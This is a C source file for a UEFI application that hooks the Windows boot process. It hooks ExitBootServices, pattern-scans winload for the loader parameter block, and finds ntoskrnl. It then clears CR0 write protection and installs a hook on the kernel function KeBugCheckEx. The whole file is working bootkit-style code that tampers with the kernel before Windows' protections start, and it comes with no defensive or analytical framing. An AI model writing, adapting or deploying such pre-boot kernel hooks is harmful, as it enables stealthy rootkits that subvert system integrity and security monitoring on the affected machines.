#include "nt.h"
#include "hook.h"
#include "drv.h"

extern EFI_RUNTIME_SERVICES* gRT;
extern EFI_BOOT_SERVICES* gBS;
EFI_EXIT_BOOT_SERVICES    gOriginalEBS;

VOID* gKernelBase = NULL;
VOID* WinloadReturnAddress = NULL;

VOID(*KeBugCheckEx)(UINT32 BugCheckCode,
    UINT64 Code1,
    UINT64 Code2,
    UINT64 Code3,
    UINT64 Code4
);

VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
{
    /*
        winload!OslpLogOsLaunch+0x21:
        00000000`0090f949 488b83f0000000  mov     rax,qword ptr [rbx+0F0h]
        00000000`0090f950 4c8b88c0090000  mov     r9,qword ptr [rax+9C0h]
        00000000`0090f957 48b877be9f1a2fdd2406 mov rax,624DD2F1A9FBE77h
        00000000`0090f961 49f7e1          mul     rax,r9
        00000000`0090f964 488b050d241e00  mov     rax,qword ptr [winload!OslLoaderBlock (00000000`00af1d78)]
    */
    UINT8 LogSig[] = { 0x48, 0xB8, 0x77, 0xBE, 0x9F, 0x1A, 0x2F, 0xDD }; // Signature around OslpLogOsLaunch+0x21 which has the move containing the LoaderBlock
    UINT8 LogMsk[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // All bytes are significant.
    UINT64 LogOsLaunchScanBase = (UINT64)FindPattern(WinloadReturnAddress, 0x10000, LogSig, sizeof(LogSig), LogMsk);

    PLOADER_PARAMETER_BLOCK LoaderBlock = *(PLOADER_PARAMETER_BLOCK*)(*(UINT32*)(LogOsLaunchScanBase + 0x10) + LogOsLaunchScanBase + 0x14);
    if (LoaderBlock == NULL)
    {
        Print(L"[-] LPB was null, crashing on purpose.");
        return;
    }

    KLDR_DATA_TABLE_ENTRY* KernelEntry = GetKernelModuleFromList(&LoaderBlock->LoadOrderListHead, L"ntoskrnl.exe");
    gKernelBase = KernelEntry->ModuleBase;

    // Disable write protection
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ull);
#pragma warning (push)
#pragma warning (disable : 4152)
    KeBugCheckEx = FindExport(gKernelBase, "KeBugCheckEx");
#pragma warning (pop)
    SetupKeBugCheckExHook(KeBugCheckEx, KeBugCheckExHook);

    AsmWriteCr0(cr0);
    return;
}


EFI_STATUS EFIAPI ExitBootServicesHook(IN EFI_HANDLE ImageHandle, IN UINTN MapKey)
{
    Print(L"[*] EBS hook triggered, gathering Winload return address\n");

    gBS->ExitBootServices = gOriginalEBS;
    Print(L"[*] Handing back control to unmodified EBS @ 0x%lx\n", gOriginalEBS);

    WinloadReturnAddress = _ReturnAddress();
    Print(L"[+] Found Winload return address: 0x%lx\n", WinloadReturnAddress);

    Print(L"\n[*] We are now waiting for the virtual address space. See ya in the kernel!\n");
    return gOriginalEBS(ImageHandle, MapKey);
}


EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE* SystemTable)
{
    Print(L"[*] Hello, world!\n");
    Print(L"[*] Our handle is 0x%lx\n", ImageHandle);
    Print(L"[*] System table: 0x%lx\n", SystemTable);

    gOriginalEBS = gBS->ExitBootServices;

    // Disable write protection
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ull);

    gBS->ExitBootServices = ExitBootServicesHook;
    Print(L"[+] ExitBootServices hook installed: 0x%lx\n", gBS->ExitBootServices);

    AsmWriteCr0(cr0);

    EFI_EVENT addressSpaceEvent = { 0 };
    Print(L"[*] Subscribing to EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE\n");
    return gBS->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &addressSpaceEvent);
}
